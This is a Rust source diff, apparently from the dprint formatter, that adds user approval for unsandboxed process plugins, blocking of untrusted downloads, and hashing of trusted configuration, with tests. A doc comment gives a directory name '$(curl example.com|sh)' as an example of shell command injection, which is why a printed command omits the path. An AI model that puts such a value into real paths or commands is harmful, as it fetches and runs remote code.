@@ -30,18 +30,24 @@ use thiserror::Error;
 use crate::arg_parser::CliArgs;
 use crate::arg_parser::ConfigDiscovery;
 use crate::arg_parser::FilePatternArgs;
+use crate::configuration::ConfigMap;
+use crate::configuration::ConfigMapValue;
 use crate::configuration::GlobalConfigDiagnostic;
+use crate::configuration::Permissions;
+use crate::configuration::ProcessPluginApproval;
 use crate::configuration::RawPluginConfigOverride;
 use crate::configuration::ResolveConfigError;
 use crate::configuration::ResolvedConfig;
 use crate::configuration::ResolvedConfigPathWithText;
+use crate::configuration::get_config_file_found_path;
 use crate::configuration::get_default_config_file_in_ancestor_directories;
 use crate::configuration::get_global_config;
 use crate::configuration::get_plugin_config_map;
+use crate::configuration::get_settings_file_path;
+use crate::configuration::resolve_config_file_dirs_at_path;
 use crate::configuration::resolve_config_from_args;
 use crate::configuration::resolve_config_from_path_with_ancestors;
 use crate::configuration::resolve_global_config_path_and_text_at_path_root;
-use crate::configuration::resolve_local_config_file_dirs;
 use crate::environment::CanonicalizedPathBuf;
 use crate::environment::Environment;
 use crate::format::EnsureStableFormat;
@@ -60,33 +66,39 @@ use crate::plugins::FormatConfig;
 use crate::plugins::InitializedPlugin;
 use crate::plugins::InitializedPluginFormatRequest;
 use crate::plugins::OutputPluginConfigDiagnosticsError;
+use crate::plugins::PluginConfigDiagnostic;
 use crate::plugins::PluginNameResolutionMaps;
 use crate::plugins::PluginResolver;
+use crate::plugins::PluginSourceReference;
 use crate::plugins::PluginWrapper;
 use crate::plugins::ReceivedPluginInfo;
+use crate::plugins::find_npm_plugin_local_path;
 use crate::plugins::output_plugin_config_diagnostics;
 use crate::utils::FastInsecureHasher;
 use crate::utils::GlobOutput;
 use crate::utils::OutsideBasePath;
 use crate::utils::PathSource;
+use crate::utils::PluginKind;
 use crate::utils::escape_glob_text_for_cli;
+use crate::utils::get_sha256_checksum;
 use crate::utils::is_negated_glob;
+use crate::utils::parse_checksum_path_or_url;
+use crate::utils::parse_npm_specifier;
+use crate::utils::quote_text;
 
 pub enum GetPluginResult {
-  /// The text of each of the plugin's configuration diagnostics in the form
-  /// it was logged.
-  HadDiagnostics(Vec<String>),
+  HadDiagnostics(Vec<PluginConfigDiagnostic>),
   Success(InitializedPluginWithConfig),
 }
 
 /// The error for formatting with a plugin that has configuration diagnostics.
 ///
 /// The diagnostics are only logged the first time the plugin is used, so this
-/// has their text for a consumer that reports each failure (ex. the lsp).
+/// has them for a consumer that reports each failure (ex. the lsp).
 #[derive(Debug, Error)]
 #[error("Had {} configuration errors.", .diagnostics.len())]
 pub struct PluginConfigDiagnosticsError {
-  pub diagnostics: Vec<String>,
+  pub diagnostics: Vec<PluginConfigDiagnostic>,
 }
 
 pub struct PluginConfigOverride {
@@ -107,7 +119,7 @@ pub struct PluginWithConfig {
   /// (ex. the exec plugin's `cacheKeyFiles` hash) invalidate the cache.
   serialized_resolved_config: String,
   /// The configuration diagnostics once checked, which is empty for none.
-  config_diagnostics: tokio::sync::Mutex<Option<Vec<String>>>,
+  config_diagnostics: tokio::sync::Mutex<Option<Vec<PluginConfigDiagnostic>>>,
 }
 
 pub struct PluginWithConfigOptions {
@@ -312,9 +324,12 @@ impl InitializedPluginWithConfig {
         global: self.plugin.format_config.global.clone(),
       });
       for diagnostic in self.instance.config_diagnostics(format_config).await? {
-        let message = format!("[{}]: {}", self.info().name, diagnostic);
-        log_warn!(environment, "{}", message);
-        diagnostics.push(message);
+        let diagnostic = PluginConfigDiagnostic {
+          plugin_name: self.info().name.to_string(),
+          diagnostic,
+        };
+        log_warn!(environment, "{}", diagnostic);
+        diagnostics.push(diagnostic);
       }
     }
 
@@ -379,6 +394,14 @@ pub struct PluginsScope<TEnvironment: Environment> {
   pub config: Option<Rc<ResolvedConfig>>,
   pub plugins: IndexMap<String, Rc<PluginWithConfig>>,
   pub plugin_name_maps: PluginNameResolutionMaps,
+  /// The urls the plugins need to be downloaded from where the download policy
+  /// doesn't allow without asking the user (ex. a domain that isn't trusted),
+  /// which has the scope not have any plugins.
+  pub untrusted_downloads: Vec<String>,
+  /// The process plugins the user didn't approve running, which has the scope
+  /// not have any plugins so that the editors don't format with the config
+  /// file until they're approved.
+  pub unapproved_process_plugins: Option<UnapprovedProcessPlugins>,
   global_config_diagnostics: Vec<GlobalConfigDiagnostic>,
   cached_editor_file_matcher: RefCell<Option<FileMatcher<TEnvironment>>>,
 }
@@ -397,6 +420,8 @@ impl<TEnvironment: Environment> PluginsScope<TEnvironment> {
       config: Some(config),
       plugin_name_maps,
       plugins: plugins.into_iter().map(|p| (p.name().to_string(), p)).collect(),
+      untrusted_downloads: Vec::new(),
+      unapproved_process_plugins: None,
       global_config_diagnostics,
       cached_editor_file_matcher: Default::default(),
     })
@@ -427,6 +452,10 @@ impl<TEnvironment: Environment> PluginsScope<TEnvironment> {
         .iter()
         .map(|name| self.plugins.get(name).and_then(|plugin| plugin.info().supports_range_formatting)),
     )
+  }
+
+  pub fn global_config_diagnostics(&self) -> &[GlobalConfigDiagnostic] {
+    &self.global_config_diagnostics
   }
 
   pub fn ensure_no_global_config_diagnostics(&self) -> Result<(), ResolveConfigError> {
@@ -542,7 +571,9 @@ impl<TEnvironment: Environment> PluginsScope<TEnvironment> {
     true
   }
 
-  fn matches_editor_file_patterns(&self, file_path: &Path) -> bool {
+  /// Gets whether the config file's includes and excludes (and the
+  /// gitignore files) match the file, which doesn't need the plugins.
+  pub fn matches_editor_file_patterns(&self, file_path: &Path) -> bool {
     let mut file_matcher_borrow = self.cached_editor_file_matcher.borrow_mut();
     if file_matcher_borrow.is_none() {
       let Some(config) = &self.config else {
@@ -1023,9 +1054,12 @@ impl<'a, TEnvironment: Environment> PluginsAndPathsResolver<'a, TEnvironment> {
     patterns: Rc<FilePatternArgs>,
   ) -> Result<Vec<PluginsScopeAndPaths<TEnvironment>>> {
     log_debug!(self.environment, "Analyzing config file {}", config_file_path.display());
-    let dirs = resolve_local_config_file_dirs(self.environment, &config_file_path)?;
+    // one that's a symlink (ex. found for a path that was given) is used for the directory it was found in and
+    // known by its path there, like in the editors (see `get_config_file_found_path`)
+    let (dirs, found_path) = resolve_config_file_dirs_at_path(self.environment, &config_file_path)?;
     let config_file_path = self.environment.canonicalize(&config_file_path)?;
-    if Some(&config_file_path) == root_config_path.as_ref() {
+    let found_path = get_config_file_found_path(found_path, config_file_path.as_ref());
+    if found_path.is_none() && Some(&config_file_path) == root_config_path.as_ref() {
       // config file specified via `--config` so ignore it
       return Ok(Vec::new());
     }
@@ -1033,6 +1067,7 @@ impl<'a, TEnvironment: Environment> PluginsAndPathsResolver<'a, TEnvironment> {
       content: self.environment.read_file(&config_file_path)?,
       base_path: dirs.base_path,
       anchored_patterns_base_path: dirs.anchored_patterns_base_path,
+      found_path,
       source: PathSource::new_local(config_file_path),
       is_global_config: false,
       is_first_download: false,
@@ -1151,6 +1186,8 @@ pub async fn get_plugins_scope_from_args<TEnvironment: Environment>(
       config: None,
       plugin_name_maps: Default::default(),
       plugins: Default::default(),
+      untrusted_downloads: Default::default(),
+      unapproved_process_plugins: Default::default(),
       global_config_diagnostics: Default::default(),
       cached_editor_file_matcher: Default::default(),
     }),
@@ -1163,15 +1200,168 @@ pub struct NoPluginsFoundError;
 
 #[derive(Debug, Error)]
 #[error(transparent)]
-pub struct ResolvePluginsError(#[from] anyhow::Error);
+pub struct ResolvePluginsError(#[from] pub anyhow::Error);
 
 pub async fn resolve_plugins_scope<TEnvironment: Environment>(
   config: Rc<ResolvedConfig>,
   environment: &TEnvironment,
   plugin_resolver: &Rc<PluginResolver<TEnvironment>>,
 ) -> Result<PluginsScope<TEnvironment>, ResolvePluginsError> {
+  resolve_plugins_scope_with_approval(config, environment, plugin_resolver, &Permissions::allow_all()).await
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Hash)]
+pub struct UnapprovedProcessPlugins {
+  pub config_file: String,
+  /// The hash of the trusted configuration of the config file, which allowing
+  /// a plugin that isn't set up is for (see `get_trusted_config_hash`).
+  pub trusted_config_hash: String,
+  pub plugins: Vec<UnapprovedProcessPlugin>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Hash)]
+pub struct UnapprovedProcessPlugin {
+  /// The plugin as the config file specifies it (ex. its url and checksum).
+  pub plugin: String,
+  /// The npm registry it's from when it isn't the default one, which is
+  /// shown with it because an `.npmrc` (ex. the project's) can make an npm
+  /// specifier that looks familiar come from somewhere else.
+  pub registry: Option<String>,
+  /// The checksum of its file when the config file doesn't pin it (an npm
+  /// plugin without a version), which is part of what allowing it approves
+  /// before it's set up like it is after (see `get_process_plugin_approval`).
+  pub unpinned_file_checksum: Option<String>,
+  /// What allowing it approves, which is `None` when it isn't set up because
+  /// its configuration isn't known until then.
+  pub approval: Option<ProcessPluginApproval>,
+}
+
+impl UnapprovedProcessPlugin {
+  /// Gets the plugin with the registry it's from when it isn't the default one.
+  /// They're quoted because they're from the project (see `quote_text`).
+  pub fn display(&self) -> String {
+    match &self.registry {
+      Some(registry) => format!("{} from {}", quote_text(&get_plugin_display_text(&self.plugin)), quote_text(registry)),
+      None => quote_text(&get_plugin_display_text(&self.plugin)),
+    }
+  }
+}
+
+impl UnapprovedProcessPlugins {
+  /// Gets whether the user denied running each of the process plugins, which
+  /// means they shouldn't be asked about them.
+  pub fn is_denied(&self, permissions: &Permissions) -> bool {
+    self.all_approvals(|approval| permissions.is_process_plugin_denied(approval))
+  }
+
+  pub fn is_always_denied(&self, permissions: &Permissions) -> bool {
+    self.all_approvals(|approval| permissions.is_process_plugin_always_denied(approval))
+  }
+
+  /// Gets the message that says dprint isn't formatting with the config file
+  /// because its process plugins weren't allowed.
+  pub fn message(&self, permissions: &Permissions) -> String {
+    let plugins = self.display_plugins();
+    let reason = match self.was_allowed_with_other_config(permissions) {
+      true => format!("the configuration of its process plugins ({}) changed since they were allowed", plugins),
+      false => format!("its process plugins ({}) weren't allowed to run", plugins),
+    };
+    let message = format!(
+      concat!(
+        "dprint isn't formatting files with {} because {}. ",
+        "Process plugins aren't sandboxed, so only allow them when you trust this configuration file."
+      ),
+      quote_text(&self.config_file),
+      reason,
+    );
+    with_ignored_settings_message(message, permissions)
+  }
+
+  /// Gets the message that asks the user to allow the process plugins, which
+  /// is one sentence with the config file (see `config_file_text`) and the
+  /// plugins, because an editor may not show line breaks (ex. a VS Code
+  /// notification). It doesn't ask a question because the editor's actions do.
+  pub fn approval_message(&self, permissions: &Permissions, config_file_text: &str) -> String {
+    let message = match self.was_allowed_with_other_config(permissions) {
+      true => format!(
+        "The configuration of the process plugins of {} ({}) changed since you allowed them.",
+        config_file_text,
+        self.display_plugins()
+      ),
+      false => format!(
+        "Formatting {} needs to run process plugins that aren't sandboxed ({}).",
+        config_file_text,
+        self.display_plugins()
+      ),
+    };
+    with_ignored_settings_message(message, permissions)
+  }
+
+  fn display_plugins(&self) -> String {
+    self.plugins.iter().map(|plugin| plugin.display()).collect::<Vec<_>>().join(", ")
+  }
+
+  fn was_allowed_with_other_config(&self, permissions: &Permissions) -> bool {
+    self
+      .plugins
+      .iter()
+      .filter_map(|plugin| plugin.approval.as_ref())
+      .any(|approval| permissions.was_allowed_with_other_config(approval))
+  }
+
+  /// Gets whether the predicate is true for what allowing each of the process
+  /// plugins approves, which is any configuration for one that isn't set up.
+  fn all_approvals(&self, predicate: impl Fn(&ProcessPluginApproval) -> bool) -> bool {
+    self.plugins.iter().all(|plugin| match &plugin.approval {
+      Some(approval) => predicate(approval),
+      None => predicate(&ProcessPluginApproval::any_config(self.config_file.clone(), plugin.plugin.clone())),
+    })
+  }
+}
+
+/// Resolves the plugins of the config like `resolve_plugins_scope`, but
+/// resolves none of them when running one of its process plugins isn't
+/// approved for the config file with its configuration, so they're never set
+/// up or started. The other plugins are left out too because formatting only
+/// some of the files (or formatting them with a lower precedence plugin) would
+/// format differently than the CLI. The process plugins of the global config
+/// file are always approved because it's the user's own.
+pub async fn resolve_plugins_scope_with_approval<TEnvironment: Environment>(
+  config: Rc<ResolvedConfig>,
+  environment: &TEnvironment,
+  plugin_resolver: &Rc<PluginResolver<TEnvironment>>,
+  permissions: &Permissions,
+) -> Result<PluginsScope<TEnvironment>, ResolvePluginsError> {
+  // When a plugin that isn't installed may not be downloaded without asking the
+  // user (ex. an editor and a domain that isn't trusted), none of the plugins are
+  // resolved because formatting with only some of them would format differently
+  // than the CLI.
+  let mut untrusted_downloads = Vec::new();
+  for download in config.plugins.iter().flat_map(|plugin| plugin_resolver.get_disallowed_downloads(plugin)) {
+    if !untrusted_downloads.contains(&download) {
+      untrusted_downloads.push(download);
+    }
+  }
+  // IMPORTANT: This needs to be checked before resolving the plugins because
+  // setting up a process plugin runs it to get its information.
+  let mut unapproved_process_plugins = get_unapproved_process_plugins_of_config(&config, plugin_resolver, environment, permissions);
+  let plugin_references = if untrusted_downloads.is_empty() && unapproved_process_plugins.is_none() {
+    config.plugins.clone()
+  } else {
+    Vec::new()
+  };
+
   // resolve the plugins
-  let plugins = filter_duplicate_plugin_names(plugin_resolver.resolve_plugins(config.plugins.clone()).await?);
+  let mut plugins = filter_duplicate_plugin_names(plugin_resolver.resolve_plugins(plugin_references).await?);
+  // IMPORTANT: A process plugin that wasn't set up may have been allowed by a decision for the
+  // configuration of another config key, because its own isn't known until it's set up (see
+  // `is_allowed_before_set_up`), so check it with its own before it runs with its configuration.
+  if !plugins.is_empty() {
+    unapproved_process_plugins = get_unapproved_process_plugins_of_config(&config, plugin_resolver, environment, permissions);
+    if unapproved_process_plugins.is_some() {
+      plugins.clear();
+    }
+  }
   let mut config_map = config.config_map.clone();
   let mut trusted_config_map = config.trusted_config_map.clone();
 
@@ -1202,6 +1392,12 @@ pub async fn resolve_plugins_scope<TEnvironment: Environment>(
   // a shared config may configure more plugins than the ones being used, so remove the leftover
   // plugin config that only an extended config specified so it's not reported as an unknown property
   config_map.retain(|key, _| !config.extended_only_plugin_config_keys.contains(key));
+  if !untrusted_downloads.is_empty() || unapproved_process_plugins.is_some() {
+    // the plugins weren't resolved or the config keys of the process plugins aren't
+    // known without setting them up, so don't report the plugin config that's left
+    // as an unknown property
+    config_map.retain(|_, value| !matches!(value, ConfigMapValue::PluginConfig(_)));
+  }
 
   // now get global config
   let global_config_result = get_global_config(config_map);
@@ -1246,7 +1442,251 @@ pub async fn resolve_plugins_scope<TEnvironment: Environment>(
     plugins.push(result?);
   }
 
-  Ok(PluginsScope::new(environment.clone(), plugins, config, global_config_result.diagnostics)?)
+  let mut scope = PluginsScope::new(environment.clone(), plugins, config, global_config_result.diagnostics)?;
+  scope.untrusted_downloads = untrusted_downloads;
+  scope.unapproved_process_plugins = unapproved_process_plugins;
+  Ok(scope)
+}
+
+/// Gets what the user approves by allowing each process plugin of the config
+/// file to run, which is `None` for a plugin that isn't set up because its
+/// configuration isn't known until then (ex. its config key). It's empty for
+/// the global config file because it's the user's own.
+pub fn get_process_plugin_approvals<TEnvironment: Environment>(
+  config: &ResolvedConfig,
+  plugin_resolver: &PluginResolver<TEnvironment>,
+  environment: &TEnvironment,
+) -> Vec<(PluginSourceReference, Option<ProcessPluginApproval>)> {
+  if config.is_global {
+    return Vec::new();
+  }
+  config
+    .plugins
+    .iter()
+    .filter(|plugin| plugin.plugin_kind() != Some(PluginKind::Wasm))
+    .map(|plugin| {
+      // IMPORTANT: Don't set up the plugin to get its information because that runs it.
+      let approval = plugin_resolver
+        .get_set_up_plugin_info(plugin)
+        .map(|info| get_process_plugin_approval(config, plugin, &info.config_key, environment));
+      (plugin.clone(), approval)
+    })
+    .collect()
+}
+
+/// Gets the process plugins of the config file that the permissions don't
+/// allow running with their configuration (see `get_process_plugin_approvals`),
+/// or setting up when they aren't set up, which is empty when using its
+/// plugins is approved.
+///
+/// A plugin the user allowed setting up for the session is allowed with any
+/// of the trusted configuration, which the editor records as allowing its own
+/// configuration once it's set up. A plugin that isn't set up is also allowed
+/// to be set up when the most recent decision for it allows it with its
+/// configuration in the trusted configuration (see `is_allowed_before_set_up`).
+pub fn get_unapproved_process_plugins<TEnvironment: Environment>(
+  config: &ResolvedConfig,
+  plugin_resolver: &PluginResolver<TEnvironment>,
+  environment: &TEnvironment,
+  permissions: &Permissions,
+) -> Vec<(PluginSourceReference, Option<ProcessPluginApproval>)> {
+  // ex. the cli, which doesn't need to make the hashes of what's allowed
+  if !permissions.requires_process_plugin_approval() {
+    return Vec::new();
+  }
+  let config_file = config.display();
+  let trusted_config_hash = get_trusted_config_hash(config);
+  get_process_plugin_approvals(config, plugin_resolver, environment)
+    .into_iter()
+    .filter(|(plugin, approval)| {
+      let unpinned_file_checksum = get_unpinned_plugin_file_checksum(plugin, environment);
+      let may_set_up =
+        || permissions.may_set_up_process_plugin(&config_file, &plugin.to_full_string(), &trusted_config_hash, unpinned_file_checksum.as_deref());
+      match approval {
+        Some(approval) => !permissions.is_process_plugin_allowed(approval) && !may_set_up(),
+        None => !may_set_up() && !is_allowed_before_set_up(config, plugin, unpinned_file_checksum, permissions),
+      }
+    })
+    .collect()
+}
+
+/// Gets the hash of the trusted configuration of the config file, which is
+/// what the user allows a process plugin that isn't set up with because the
+/// configuration of the plugin isn't known until then. It starts with the
+/// version of how it's made and a colon like the config hash of a process
+/// plugin approval (see `TRUSTED_CONFIG_HASH_VERSION`).
+pub fn get_trusted_config_hash(config: &ResolvedConfig) -> String {
+  get_trusted_config_map_hash(&config.trusted_config_map)
+}
+
+pub(crate) fn get_trusted_config_map_hash(trusted_config_map: &ConfigMap) -> String {
+  let text = serde_json::to_string(trusted_config_map).expect("config should serialize");
+  format!("{}:{}", TRUSTED_CONFIG_HASH_VERSION, get_sha256_checksum(text.as_bytes()))
+}
+
+/// Gets the message that says how to have the process plugins of a config file
+/// run when the editor can't ask whether to allow them.
+///
+/// IMPORTANT: The command doesn't have the config file's path, because the user
+/// may paste it into a shell, which could run what the path has (ex. a
+/// directory named `$(curl example.com|sh)`), and no quoting is safe in every
+/// shell. It's run in the config file's directory instead.
+pub fn get_cant_ask_message(environment: &impl Environment, config_file: &str) -> String {
+  let file_path = get_settings_file_path(environment).map(|path| path.display().to_string());
+  let is_remote = ["http://", "https://", "npm:"].iter().any(|prefix| config_file.starts_with(prefix));
+  format!(
+    concat!(
+      "The editor can't ask whether to allow them, so dprint only formats with it once you allow them by running ",
+      "{} or when \"editor.allowProcessPlugins\" is true in {}."
+    ),
+    match is_remote {
+      true => "`dprint config install --config` with the configuration file's url",
+      false => "`dprint config install` in the directory of the configuration file",
+    },
+    file_path.as_deref().unwrap_or("settings.json in dprint's global config directory"),
+  )
+}
+
+/// Gets the process plugins of the config file that the permissions don't
+/// allow like `get_unapproved_process_plugins`, which is `None` when using its
+/// plugins is approved.
+fn get_unapproved_process_plugins_of_config<TEnvironment: Environment>(
+  config: &ResolvedConfig,
+  plugin_resolver: &PluginResolver<TEnvironment>,
+  environment: &TEnvironment,
+  permissions: &Permissions,
+) -> Option<UnapprovedProcessPlugins> {
+  let plugins = get_unapproved_process_plugins(config, plugin_resolver, environment, permissions)
+    .into_iter()
+    .map(|(plugin, approval)| UnapprovedProcessPlugin {
+      plugin: plugin.to_full_string(),
+      registry: plugin_resolver.get_npm_registry(&plugin),
+      unpinned_file_checksum: get_unpinned_plugin_file_checksum(&plugin, environment),
+      approval,
+    })
+    .collect::<Vec<_>>();
+  if plugins.is_empty() {
+    return None;
+  }
+  let config_file = config.display();
+  log_debug!(
+    environment,
+    "Not using the plugins of {} because its process plugins weren't approved",
+    config_file
+  );
+  Some(UnapprovedProcessPlugins {
+    config_file,
+    trusted_config_hash: get_trusted_config_hash(config),
+    plugins,
+  })
+}
+
+/// Gets whether the most recent decision for a process plugin of the config
+/// file that isn't set up allows it with its configuration in the trusted
+/// configuration, so it may be set up (ex. it was allowed by another version
+/// of dprint, or by this one before an upgrade or with another cache
+/// directory, which don't have it set up). Its config key isn't known until
+/// it's set up, so it's the configuration of the key the decision was stored
+/// with, or of any key (or none) when it wasn't stored with one. The plugin
+/// is checked again with its own config key once it's set up and before it's
+/// run with its configuration (see `resolve_plugins_scope_with_approval`).
+///
+/// Setting it up runs it to get its information without a configuration,
+/// which the decision allows because it allows running the plugin.
+fn is_allowed_before_set_up(
+  config: &ResolvedConfig,
+  plugin: &PluginSourceReference,
+  unpinned_file_checksum: Option<String>,
+  permissions: &Permissions,
+) -> bool {
+  let Some(allowed) = permissions.get_latest_allow(&config.display(), &plugin.to_full_string()) else {
+    return false;
+  };
+  let is_allowed_config = |plugin_config: Option<&ConfigMapValue>| {
+    allowed.config_hash.as_deref() == Some(get_process_plugin_config_hash(unpinned_file_checksum.clone(), plugin_config).as_str())
+  };
+  match &allowed.config_key {
+    Some(config_key) => is_allowed_config(config.trusted_config_map.get(config_key)),
+    None => is_allowed_config(None) || config.trusted_config_map.values().any(|value| is_allowed_config(Some(value))),
+  }
+}
+
+/// Gets what the user approves when allowing a process plugin of the config
+/// file to run, which is the plugin with its configuration so that a change to
+/// either (ex. the commands of dprint-plugin-exec) needs to be approved again.
+/// The global configuration isn't part of it because it can't have a plugin do
+/// something else.
+fn get_process_plugin_approval(
+  config: &ResolvedConfig,
+  plugin: &PluginSourceReference,
+  config_key: &str,
+  environment: &impl Environment,
+) -> ProcessPluginApproval {
+  // only the trusted config is used for process plugins
+  let config_hash = get_process_plugin_config_hash(
+    get_unpinned_plugin_file_checksum(plugin, environment),
+    config.trusted_config_map.get(config_key),
+  );
+  ProcessPluginApproval {
+    config_file: config.display(),
+    plugin: plugin.to_full_string(),
+    config_hash: Some(config_hash),
+    config_key: Some(config_key.to_string()),
+  }
+}
+
+/// The version of how the config hash of a process plugin approval is made
+/// (see `ProcessPluginApproval::config_hash`), which is stored with it and
+/// needs to be increased when what's hashed changes (ex. a property is added
+/// to `ApprovedPlugin` or the configuration serializes differently) so that a
+/// decision isn't reported as being for another configuration. An allow with
+/// a hash made another way isn't used, and storing an allow keeps it, so the
+/// versions of dprint that make it differently don't undo each other's allows
+/// (see `EditorApprovals`).
+pub(crate) const PROCESS_PLUGIN_CONFIG_HASH_VERSION: u32 = 1;
+
+/// The version of how the hash of the trusted configuration of a config file
+/// is made (see `get_trusted_config_hash`), which needs to be increased when
+/// what's hashed changes (ex. the configuration serializes differently). The
+/// hash is part of the approval ids of process plugins that aren't set up, so
+/// that changes them too.
+const TRUSTED_CONFIG_HASH_VERSION: u32 = 1;
+
+/// Gets the hash of what's approved with a process plugin, which starts with
+/// how it's made (see `PROCESS_PLUGIN_CONFIG_HASH_VERSION`).
+fn get_process_plugin_config_hash(plugin_file: Option<String>, config: Option<&ConfigMapValue>) -> String {
+  #[derive(serde::Serialize)]
+  #[serde(rename_all = "camelCase")]
+  struct ApprovedPlugin<'a> {
+    /// The checksum of the plugin file when the config file doesn't pin it.
+    plugin_file: Option<String>,
+    config: Option<&'a ConfigMapValue>,
+  }
+
+  let text = serde_json::to_string(&ApprovedPlugin { plugin_file, config }).expect("config should serialize");
+  format!("{}:{}", PROCESS_PLUGIN_CONFIG_HASH_VERSION, get_sha256_checksum(text.as_bytes()))
+}
+
+/// Gets the checksum of the plugin file when the config file doesn't pin it,
+/// which is an npm plugin without a version that's resolved from node_modules
+/// (ex. updating the package changes it). Every other process plugin needs a
+/// checksum in the config file, and the plugin file pins the executables with
+/// their checksums.
+pub fn get_unpinned_plugin_file_checksum(plugin: &PluginSourceReference, environment: &impl Environment) -> Option<String> {
+  let PathSource::Npm(npm_source) = &plugin.path_source else {
+    return None;
+  };
+  if npm_source.specifier.version.is_some() {
+    return None;
+  }
+  let cwd = environment.cwd();
+  let config_dir = npm_source.base_dir.as_ref().map(|dir| dir.as_ref()).unwrap_or(cwd.as_ref());
+  let checksum = find_npm_plugin_local_path(&npm_source.specifier, config_dir, environment)
+    .ok()
+    .and_then(|path| path.maybe_local_path().and_then(|path| environment.read_file_bytes(path).ok()))
+    .map(|bytes| get_sha256_checksum(&bytes));
+  // resolving the plugin fails later when it can't be read
+  Some(checksum.unwrap_or_else(|| "unreadable".to_string()))
 }
 
 /// Keeps only the highest precedence plugin for each plugin name.
@@ -1295,6 +1735,27 @@ fn get_warn_remote_process_plugin_config_message(config_key: &str) -> String {
   )
 }
 
+/// Gets the plugin as a config file specifies it without its checksum, which
+/// is how it's shown.
+pub fn get_plugin_display_text(plugin: &str) -> String {
+  match plugin.starts_with("npm:") {
+    true => parse_npm_specifier(plugin)
+      .map(|parsed| parsed.specifier.display())
+      .unwrap_or_else(|_| plugin.to_string()),
+    false => parse_checksum_path_or_url(plugin).path_or_url,
+  }
+}
+
+/// Adds why the settings file isn't used when it isn't, which may be why the
+/// user is asked (ex. it allows every process plugin).
+fn with_ignored_settings_message(mut message: String, permissions: &Permissions) -> String {
+  if let Some(ignored_settings_message) = &permissions.ignored_settings_message {
+    message.push(' ');
+    message.push_str(ignored_settings_message);
+  }
+  message
+}
+
 #[cfg(test)]
 mod test {
   use dprint_core::configuration::ConfigKeyValue;
@@ -1303,6 +1764,20 @@ mod test {
   use crate::plugins::TestPlugin;
 
   use super::*;
+
+  #[test]
+  fn should_get_the_plugin_display_text_without_its_checksum() {
+    assert_eq!(
+      get_plugin_display_text("npm:@dprint/exec@0.7.4/plugin.json@abc123"),
+      "npm:@dprint/exec@0.7.4/plugin.json"
+    );
+    assert_eq!(get_plugin_display_text("npm:@dprint/exec@0.7.4"), "npm:@dprint/exec@0.7.4");
+    assert_eq!(
+      get_plugin_display_text("https://plugins.dprint.dev/exec-0.5.0.json@abc123"),
+      "https://plugins.dprint.dev/exec-0.5.0.json"
+    );
+    assert_eq!(get_plugin_display_text("/plugins/exec.json"), "/plugins/exec.json");
+  }
 
   // a plugin can derive values at resolution time that aren't present in the
   // raw config map (ex. the exec plugin folds the contents of `cacheKeyFiles`
@@ -1401,10 +1876,12 @@ mod test {
         config_map: Default::default(),
         trusted_config_map: Default::default(),
         extended_only_plugin_config_keys: Default::default(),
+        local_dependencies: Default::default(),
         base_path: base_path.clone(),
         anchored_patterns_base_path: None,
         source: PathSource::new_local(base_path.join_panic_relative("dprint.json")),
         is_global: false,
+        found_path: None,
         excludes: None,
         includes: None,
         incremental: None,
@@ -1509,5 +1986,74 @@ mod test {
     assert_eq!(get(&[Some(true), Some(true)]), RangeFormattingSupport::Supported);
     assert_eq!(get(&[Some(true), None]), RangeFormattingSupport::Unknown);
     assert_eq!(get(&[None, Some(false), Some(true)]), RangeFormattingSupport::NotSupported);
+  }
+
+  #[test]
+  fn should_not_change_the_config_hash_of_a_process_plugin() {
+    use crate::configuration::RawPluginConfig;
+    use crate::configuration::RawPluginConfigOverride;
+    use dprint_core::configuration::ConfigKeyMap;
+
+    // IMPORTANT: The hashes are stored with what the user allowed, so increase
+    // PROCESS_PLUGIN_CONFIG_HASH_VERSION when these change.
+    let config = ConfigMapValue::PluginConfig(RawPluginConfig {
+      associations: Some(vec!["**/*.txt".to_string()]),
+      locked: true,
+      overrides: vec![RawPluginConfigOverride {
+        files: vec!["sub/**".to_string()],
+        properties: ConfigKeyMap::from([("lineWidth".to_string(), ConfigKeyValue::from_i32(80))]),
+      }],
+      properties: ConfigKeyMap::from([
+        (
+          "commands".to_string(),
+          ConfigKeyValue::Array(vec![ConfigKeyValue::Object(ConfigKeyMap::from([
+            ("command".to_string(), ConfigKeyValue::from_str("fmt")),
+            ("exts".to_string(), ConfigKeyValue::Array(vec![ConfigKeyValue::from_str("txt")])),
+          ]))]),
+        ),
+        ("useTabs".to_string(), ConfigKeyValue::from_bool(false)),
+        ("other".to_string(), ConfigKeyValue::Null),
+      ]),
+    });
+    assert_eq!(
+      get_process_plugin_config_hash(Some("checksum".to_string()), Some(&config)),
+      "1:7fb2ae9589f5c2f7e6bde8c7a085905d67ded6856bd76721405273d002d6931f"
+    );
+    assert_eq!(
+      get_process_plugin_config_hash(None, None),
+      "1:b7c29ac8d0482200b6bcc038d421169c8604a546b3fca5b95b5baf3dfb4c1432"
+    );
+  }
+
+  #[test]
+  fn should_not_change_the_trusted_config_hash() {
+    use crate::configuration::RawPluginConfig;
+    use dprint_core::configuration::ConfigKeyMap;
+
+    // IMPORTANT: The hash is part of the approval ids that the editor extensions
+    // send a decision again for after the server restarts, so increase
+    // TRUSTED_CONFIG_HASH_VERSION when these change.
+    let config_map = ConfigMap::from([
+      ("lineWidth".to_string(), ConfigMapValue::from_i32(80)),
+      ("useTabs".to_string(), ConfigMapValue::from_bool(true)),
+      ("excludes".to_string(), ConfigMapValue::Vec(vec!["**/target".to_string()])),
+      (
+        "exec".to_string(),
+        ConfigMapValue::PluginConfig(RawPluginConfig {
+          associations: None,
+          locked: false,
+          overrides: Vec::new(),
+          properties: ConfigKeyMap::from([("cwd".to_string(), ConfigKeyValue::from_str("sub"))]),
+        }),
+      ),
+    ]);
+    assert_eq!(
+      get_trusted_config_map_hash(&config_map),
+      "1:b446ed44effe92b6f8491f311559164f69b32f8c7fae77308f680d264749ccac"
+    );
+    assert_eq!(
+      get_trusted_config_map_hash(&ConfigMap::new()),
+      "1:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a"
+    );
   }
 }
